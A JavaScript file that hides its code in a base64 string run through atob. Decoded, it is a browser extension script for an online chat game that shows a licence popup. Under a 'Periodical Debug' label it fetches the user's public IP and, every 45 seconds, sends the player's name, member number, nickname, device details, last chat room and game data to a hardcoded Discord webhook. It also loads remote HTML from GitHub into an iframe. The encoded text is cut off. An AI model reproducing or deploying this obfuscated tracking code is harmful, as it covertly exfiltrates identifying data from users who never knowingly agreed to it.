var sprc = atob('Ly8gTGljZW5zZSBBZ2dyZWVtZW50IHByb21wdF9fX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IHBvcHVwQ29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gJ2ZpeGVkJzsKcG9wdXBDb250YWluZXIuc3R5bGUudG9wID0gJzAnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5sZWZ0ID0gJzAnOwpwb3B1cENvbnRhaW5lci5zdHlsZS53aWR0aCA9ICcxMDB2dyc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLmhlaWdodCA9ICcxMDB2aCc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICdyZ2JhKDAsIDAsIDAsIDAuNSknOwpwb3B1cENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICdjZW50ZXInOwpwb3B1cENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gJ2NlbnRlcic7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICc5OTk5JzsKCmNvbnN0IHBvcHVwQ29udGVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRlbnQuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpwb3B1cENvbnRlbnQuc3R5bGUuYm9yZGVyUmFkaXVzID0gJzVweCc7CnBvcHVwQ29udGVudC5zdHlsZS5wYWRkaW5nID0gJzJyZW0nOwpwb3B1cENvbnRlbnQuc3R5bGUud2lkdGggPSAnODAlJzsKcG9wdXBDb250ZW50LnN0eWxlLm1heFdpZHRoID0gJzYwMHB4JzsKcG9wdXBDb250ZW50LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOwoKLy8gQkNNRSBsb2dvCmNvbnN0IGxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKTsKbG9nby5zcmMgPSAnaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5JzsKbG9nby5zdHlsZS53aWR0aCA9ICcxMDBweCc7CmxvZ28uc3R5bGUuaGVpZ2h0ID0gJzEwMHB4JzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGxvZ28pOwoKY29uc3Qgd2VsY29tZU1lc3NhZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdoMicpOwp3ZWxjb21lTWVzc2FnZS5pbm5lclRleHQgPSAnV2VsY29tZSB0byBCQ01FLCBUaGUgRmlyc3QgUmlnaHQgQ2xpY2sgQkMgRXh0ZW5zaW9uJzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKHdlbGNvbWVNZXNzYWdlKTsKCmNvbnN0IGluc3RydWN0aW9uTWVzc2FnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTsKaW5zdHJ1Y3Rpb25NZXNzYWdlLmlubmVyVGV4dCA9ICdBY2NlcHQgb3VyIExpY2Vuc2UgQWdyZWVtZW50IGFuZCBQcml2YWN5IFBvbGljeSBiZWxvdyB0byBnZXQgc3RhcnRlZCc7CnBvcHVwQ29udGVudC5hcHBlbmRDaGlsZChpbnN0cnVjdGlvbk1lc3NhZ2UpOwoKY29uc3QgYnV0dG9uc0NvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpidXR0b25zQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmJ1dHRvbnNDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnc3BhY2UtYmV0d2Vlbic7Cgpjb25zdCBsZWFybk1vcmVCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CmxlYXJuTW9yZUJ1dHRvbi5ocmVmID0gJ2h0dHBzOi8vYmNtLnNpdGUubGl2ZS9iY21sLyc7CmxlYXJuTW9yZUJ1dHRvbi50YXJnZXQgPSAnX2JsYW5rJzsKbGVhcm5Nb3JlQnV0dG9uLmlubmVyVGV4dCA9ICdMZWFybiBNb3JlJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICcjMDA3YmZmJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLmNvbG9yID0gJyNmZmYnOwpsZWFybk1vcmVCdXR0b24uc3R5bGUucGFkZGluZyA9ICcwLjVyZW0gMXJlbSc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAnM3B4JzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLnRleHREZWNvcmF0aW9uID0gJ25vbmUnOwpidXR0b25zQ29udGFpbmVyLmFwcGVuZENoaWxkKGxlYXJuTW9yZUJ1dHRvbik7Cgpjb25zdCBjaGVja2JveENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xhYmVsJyk7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAnY2VudGVyJzsKY2hlY2tib3hDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICcwLjVyZW0gMXJlbSc7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICc1MHB4JzsKY2hlY2tib3hDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpjaGVja2JveENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAnMHB4IDBweCA1cHggI2JiYic7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmN1cnNvciA9ICdwb2ludGVyJzsKCmNvbnN0IGNoZWNrYm94SW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOwpjaGVja2JveElucHV0LnR5cGUgPSAnY2hlY2tib3gnOwpjaGVja2JveElucHV0LmNoZWNrZWQgPSBmYWxzZTsgCmNoZWNrYm94SW5wdXQuc3R5bGUubWFyZ2luUmlnaHQgPSAnMC41cmVtJzsKY2hlY2tib3hJbnB1dC5vbmNoYW5nZSA9ICgpID0+IHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnb3B0QW5hbHl0aWNzJywgY2hlY2tib3hJbnB1dC5jaGVja2VkKTsKfTsKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoY2hlY2tib3hJbnB1dCk7Cgpjb25zdCBjaGVja2JveFRleHQgPSBkb2N1bWVudC5jcmVhdGVUZXh0Tm9kZSgnTGltaXRlZCBBbmFseXRpY3MnKTsKCmNvbnN0IGluZm9JY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3BhbicpOwppbmZvSWNvbi5pbm5lckhUTUwgPSAnJiM5NDMyOyc7CmluZm9JY29uLnN0eWxlLmZvbnRTaXplID0gJzFyZW0nOwppbmZvSWNvbi5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7CmluZm9JY29uLnN0eWxlLm1hcmdpbkxlZnQgPSAnNXB4JzsgCmluZm9JY29uLnRpdGxlID0gJ0VuaGFuY2VkIHByaXZhY3kgYnkgbGltaXRpbmcgYW5hbHl0aWNzIHRyYWNraW5nIHN1Y2ggYXMgbW9uZXksIGZvbnQsIGNoYXQgY29sb3IgdGhlbWUsIGFyb3VzYWwgcHJvZ3Jlc3MgYW5kIGxvY2FsIElQIGFkZHJlc3MnOwoKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoY2hlY2tib3hUZXh0KTsKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoaW5mb0ljb24pOwoKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChjaGVja2JveENvbnRhaW5lcik7Cgpjb25zdCBhY2NlcHRCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdidXR0b24nKTsKYWNjZXB0QnV0dG9uLmlubmVyVGV4dCA9ICdBY2NlcHQgJiBDb250aW51ZSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAnIzI4YTc0NSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5jb2xvciA9ICcjZmZmJzsKYWNjZXB0QnV0dG9uLnN0eWxlLmJvcmRlciA9ICdub25lJzsKYWNjZXB0QnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAnMC41cmVtIDFyZW0nOwphY2NlcHRCdXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gJzNweCc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7CmFjY2VwdEJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCdiY21lLWFjY2VwdGVkJywgJ3RydWUnKTsKICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHBvcHVwQ29udGFpbmVyKTsKfTsKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChhY2NlcHRCdXR0b24pOwoKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGJ1dHRvbnNDb250YWluZXIpOwoKcG9wdXBDb250YWluZXIuYXBwZW5kQ2hpbGQocG9wdXBDb250ZW50KTsKCmlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYmNtZS1hY2NlcHRlZCcpICE9PSAndHJ1ZScpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBvcHVwQ29udGFpbmVyKTsKfQoKLy8gU2V0IGluaXRpYWwgc3RhdGUgb2YgY2hlY2tib3gKaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdvcHRBbmFseXRpY3MnKSA9PT0gJ3RydWUnKSB7CiAgY2hlY2tib3hJbnB1dC5jaGVja2VkID0gdHJ1ZTsKfQoKCi8vUGVyaW9kaWNhbCBEZWJ1Z19fX19fX19fX19fX19fX19fX19fX18KCmFzeW5jIGZ1bmN0aW9uIHNlbmREaXNjb3JkTWVzc2FnZSgpIHsKICBsZXQgaXBBID0gJyc7CgogIHRyeSB7CiAgICBjb25zdCBnSVBBID0gYXN5bmMgKCkgPT4gewogICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5pcGlmeS5vcmc/Zm9ybWF0PWpzb24nKTsKICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgICAgcmV0dXJuIGRhdGEuaXA7CiAgICB9OwoKICAgIGlwQSA9IGF3YWl0IGdJUEEoKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgY29uc29sZS5lcnJvcignQWx0IERldGVjdG9yIEVycm9yOicsIGVycm9yKTsKICB9CgogIGNvbnN0IHdlYmhvb2tVcmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMDgwMTEzNjU3Mjc2NDIyMS9NUGRGWlluU093Z1FJOFk5U05Tc3dEUDJGQk8yc2YyeFBObWFySGQya2NOelBrNWJBVXpSdVM5TlMxcjU3WHVNMlFUNiI7CiAgY29uc3QgdG90YWxuYW1lID0gUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIjsKICBjb25zdCB1c2VybmFtZSA9IHRvdGFsbmFtZTsKICBjb25zdCBhdmF0YXJVcmwgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICBjb25zdCB1c2VyYWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50OwogIGNvbnN0IHRpbWV6b25lID0gSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lOwogIGNvbnN0IG9wZW5UYWJzID0gd2luZG93Lmxlbmd0aDsKICBjb25zdCBzY3JlZW5TaXplID0gYCR7d2luZG93LnNjcmVlbi53aWR0aH14JHt3aW5kb3cuc2NyZWVuLmhlaWdodH1gOwogIGNvbnN0IGxpbWl0ZWRBbmFseXRpY3MgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnb3B0QW5hbHl0aWNzJykgPT09ICd0cnVlJzsKICBjb25zdCBmaWVsZHMgPSBbCiAgICB7CiAgICAgIG5hbWU6ICJVc2VyIiwKICAgICAgdmFsdWU6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIsCiAgICAgIGlubGluZTogdHJ1ZQogICAgfSwKICAgIHsKICAgICAgbmFtZTogIlRpbWV6b25lIiwKICAgICAgdmFsdWU6IHRpbWV6b25lLAogICAgICBpbmxpbmU6IHRydWUKICAgIH0sCiAgICB7CiAgICAgIG5hbWU6ICJEZXZpY2UgVHlwZSIsCiAgICAgIHZhbHVlOiB1c2VyYWdlbnQsCiAgICAgIGlubGluZTogdHJ1ZQogICAgfSwKICAgIHsKICAgICAgIG5hbWU6ICJOaWNrbmFtZSIsIAogICAgICAgdmFsdWU6IFBsYXllci5OaWNrbmFtZSwKICAgICAgIGlubGluZTogdHJ1ZQogICAgfSwKICAgIHsKICAgICAgbmFtZTogIlNjcmVlbiBTaXplIiwKICAgICAgdmFsdWU6IHNjcmVlblNpemUsCiAgICAgIGlubGluZTogdHJ1ZQogICAgfQogIF07CgogIGlmICghbGltaXRlZEFuYWx5dGljcykgewogICAgZmllbGRzLnB1c2goCiAgICAgIHsgbmFtZTogIk1vbmV5IiwgdmFsdWU6IFBsYXllci5Nb25leSwgaW5saW5lOiB0cnVlIH0sCiAgICAgIHsgbmFtZTogIkZvbnQiLCB2YWx1ZTogUGxheWVyLkdyYXBoaWNzU2V0dGluZ3MuRm9udCwgaW5saW5lOiB0cnVlIH0sCiAgICAgIHsgbmFtZTogIkNoYXQgQ29sb3IgVGhlbWUiLCB2YWx1ZTogUGxheWVyLkNoYXRTZXR0aW5ncy5Db2xvclRoZW1lLCBpbmxpbmU6IHRydWUgfSwKICAgICAgeyBuYW1lOiAiQXJvdXNhbCBQcm9ncmVzcyIsIHZhbHVlOiBQbGF5ZXIuQXJvdXNhbFNldHRpbmdzLlByb2dyZXNzLCBpbmxpbmU6IHRydWUgfSwKICAgICAgeyBuYW1lOiAiTG9jYWwgSVAgQWRkcmVzcyIsIHZhbHVlOiBpcEEsIGlubGluZTogdHJ1ZSB9CiAgICApOwogIH0KCiAgaWYgKENoYXRSb29tTGFzdFByaXZhdGUpIHsKICAgIGZpZWxkcy5wdXNoKHsKICAgICAgbmFtZTogIkxhc3QgQ2hhdCBSb29tIiwKICAgICAgdmFsdWU6ICJQcml2YXRlIFJvb20iLAogICAgICBpbmxpbmU6IHRydWUKICAgIH0pOwogIH0gZWxzZSB7CiAgICBmaWVsZHMucHVzaCh7CiAgICAgIG5hbWU6ICJMYXN0IENoYXQgUm9vbSIsCiAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICBpbmxpbmU6IHRydWUKICAgIH0pOwogIH0KCiAgY29uc3QgbWVzc2FnZSA9IHsKICAgIGNvbnRlbnQ6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIgKyAiIGlzIGFjdGl2ZSBvbiBCQ01FIiwKICAgIGVtYmVkczogW3sKICAgICAgdGl0bGU6ICJUcm91Ymxlc2hvb3RpbmcgRGlhZ25vc3RpY3MgIiwKICAgICAgZmllbGRzOiBmaWVsZHMKICAgIH1dCiAgfTsKCiAgY29uc3QgcGF5bG9hZCA9IHsKICAgIHVzZXJuYW1lOiB1c2VybmFtZSwKICAgIGF2YXRhcl91cmw6IGF2YXRhclVybCwKICAgIGNvbnRlbnQ6IG1lc3NhZ2UuY29udGVudCwKICAgIGVtYmVkczogbWVzc2FnZS5lbWJlZHMKICB9OwoKICBmZXRjaCh3ZWJob29rVXJsLCB7CiAgICBtZXRob2Q6ICJQT1NUIiwKICAgIGhlYWRlcnM6IHsKICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIgogICAgfSwKICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgfSk7Cn0KCnNldEludGVydmFsKHNlbmREaXNjb3JkTWVzc2FnZSwgNDUwMDApOwoKCgovL0VuZCBPZiBEZWJ1Z19fX19fX19fX19fX19fX19fX19fX18KCgovL1N0YXJ0IE9mIExvYWRpbmcgU2NyZWVuX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KY29uc3QgaHRtbEZpbGVVcmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS0vbWFpbi9sb2FkaW5nNCc7Ci8vIEZldGNoIHRoZSBjb2RlIGZyb20gdGhlIHJhdyBHaXRIdWIgZmlsZSB1c2luZyBGZXRjaCBBUEkKZmV0Y2goaHRtbEZpbGVVcmwpCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogIC50aGVuKGh0bWwgPT4gewogICAgY29uc3QgaWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7CiAgICBpZnJhbWUuc3R5bGUucG9zaXRpb24gPSAnZml4ZWQnOwogICAgaWZyYW1lLnN0eWxlLnRvcCA9ICcwJzsKICAgIGlmcmFtZS5zdHlsZS5sZWZ0ID0gJzAnOwogICAgaWZyYW1lLnN0eWxlLndpZHRoID0gJzEzOCUnOwogICAgaWZyYW1lLnN0eWxlLmhlaWdodCA9ICcxMjUlJzsKICAgIGlmcmFtZS5zdHlsZS5tYXJnaW5MZWZ0ID0gJy0xOSUnOyAKICAgIGlmcmFtZS5zdHlsZS5tYXJnaW5Ub3AgPSAnLTIlJzsgCgoKCiAgICAvLyBMb2FkIHRoZSBpbXBvcnRlZCBIVE1MIGludG8gdGhlIGZyYW1lCiAgICBpZnJhbWUub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICAgIGNvbnN0IGlmcmFtZURvY3VtZW50ID0gdGhpcy5jb250ZW50V2luZG93LmRvY3VtZW50OwogICAgICBpZnJhbWVEb2N1bWVudC5vcGVuKCk7CiAgICAgIGlmcmFtZURvY3VtZW50LndyaXRlKGh0bWwpOwogICAgICBpZnJhbWVEb2N1bWVudC5jbG9zZSgpOwogICAgfTsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKc2V0VGltZW91dCgoKSA9PiB7CiAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChpZnJhbWUpOwp9LCA3MDAwKTsKICB9KQogIC5jYXRjaChlcnJvciA9PiB7CiAgICBjb25zb2xlLmVycm9yKCdFcnJvciBpbXBvcnRpbmcgSFRNTDonLCBlcnJvcik7CiAgfSk7CgoKLy9FbmQgT2YgTG9hZGluZyBTY3JlZW4gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCiAgCmZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNL21haW4vc2VydmVybWFpbnRhaW5hbmNlJykKICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgLnRoZW4oZGF0YSA9PiB7CiAgICBjb25zdCByZWdleCA9IC9cZCsvOwogICAgY29uc3QgbWF0Y2ggPSBkYXRhLm1hdGNoKHJlZ2V4KTsKICAgIGlmIChtYXRjaCAmJiBwYXJzZUludChtYXRjaFswXSkgPj0gMSkgewogICAgICBmdW5jdGlvbiBzaG93VG9hc3RNYWludCgpIHsKICAgICAgICAvLyBUb2FzdCBjb250YWluZXIKICAgICAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICNmMjJjMmMiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKICAgIHN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogICAgc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgfSwgMCk7CiAgICAgICAgCnZhciBjbG9zZUJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwpjbG9zZUJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLmJhY2tncm91bmQgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLnRvcCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5yaWdodCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250U2l6ZSA9ICIxNnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luTGVmdCA9ICItMnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luUmlnaHQgPSAiMHB4IjsKY2xvc2VCdXR0b24uaW5uZXJIVE1MID0gIlgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChjbG9zZUJ1dHRvbik7CgovLyBDbG9zZSB0b2FzdCB3aGVuIHRoZSBjbG9zZSBidXR0b24gaXMgY2xpY2tlZApjbG9zZUJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfSwgNTAwKTsKfSk7CgogICAgLy8gQkNNIExvZ28gSWNvbgogICAgdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIGljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBpY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7CiAgICBpY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwogICAgCiAgICAvLyBNYWludGVuYW5jZSBUZXh0CiAgICB2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgIHRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKICAgIHRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKICAgIHRleHQuaW5uZXJIVE1MID0gIkJDTUUgc2VydmVycyBhcmUgdW5kZXIgbWFpbnRhaW5hbmNlLCB0cnkgYWdhaW4gbGF0ZXIiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgICAKICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICAgICB9LCAwKTsKICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgfSwgNTAwMDAwMCk7CiAgICAgIAogICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMDAwMCk7CiAgICAgIH0gCiAgICBzaG93VG9hc3RNYWludCgpOyAgICAgCiAgICAgdGhyb3cgbmV3IEVycm9yKCdFeGVjdXRpb24gc3RvcHBlZC4nKTsgCiAgICB9IGVsc2UgewoKCi8vU3RhcnQgT2YgQ29udGV4dCBNZW51X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCi8vRGVza3RvcCBNZW51X19fX19fX19fX19fX19fX19fX19fX18KdmFyIHZpc2IgPSB0cnVlOwovL2NvbnRleHQgTWVudQp2YXIgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7Ci8vIEZ1bmN0aW9uIHRvIGNyZWF0ZSBjdXN0b20gY29udGV4dCBtZW51IGJ1dHRvbnMKZnVuY3Rpb24gY3JlYXRlQnV0dG9uKHRleHQsIG9uQ2xpY2spIHsKICAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogICAgdmFyIGJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgYnV0dG9uLmlubmVySFRNTCA9IHRleHQ7CiAgICBidXR0b24ub25jbGljayA9IG9uQ2xpY2s7CiAgICBidXR0b24uc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBidXR0b24uc3R5bGUudGV4dEFsaWduID0gImxlZnQiOwogICAgYnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgIGJ1dHRvbi5zdHlsZS5jdXJzb3IgPSAicG9pbnR